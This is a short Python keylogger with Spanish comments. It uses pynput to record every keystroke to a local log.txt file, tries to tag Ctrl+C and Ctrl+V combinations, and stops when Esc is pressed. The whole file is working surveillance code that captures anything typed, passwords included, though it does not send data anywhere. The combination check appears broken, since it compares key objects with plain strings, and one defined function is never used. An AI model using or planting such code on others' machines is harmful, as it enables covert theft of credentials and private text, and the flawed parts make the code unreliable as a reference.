from pynput.keyboard import Key, Listener

keys = []

def presionar_tecla(key):
    keys.append(key)
    
    # Revisar si se ha presionado una combinación de teclas
    for combo, text in COMBOS.items():
        if keys[-len(combo):] == combo:
            # Se ha presionado la combinación, escribir en el archivo de log
            with open('log.txt', 'a') as logfile:
                logfile.write(text + '\n')
            # Limpiar la lista de teclas presionadas
            keys.clear()
            break

    # Convertir la tecla presionada a texto y escribir en el archivo de log
    with open('log.txt', 'a') as logfile:
        if key == Key.enter:
            logfile.write('\n')
        else:
            key_str = str(key).replace("'", "")
            logfile.write(key_str)


COMBOS = {
    (Key.ctrl_l, 'v'): '[CTRL+V]',
    (Key.ctrl_r, 'v'): '[CTRL+V]',
    (Key.ctrl_l, 'c'): '[CTRL+C]',
    (Key.ctrl_r, 'c'): '[CTRL+C]'
}


def convertir_string(keys):
    with open('log.txt','w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            cleaner_key = key+'\n'
            logfile.write(cleaner_key)


def soltar_tecla(key):
    if key == Key.esc:
        return False


with Listener(on_press = presionar_tecla, on_release = soltar_tecla) as listener:
    listener.join()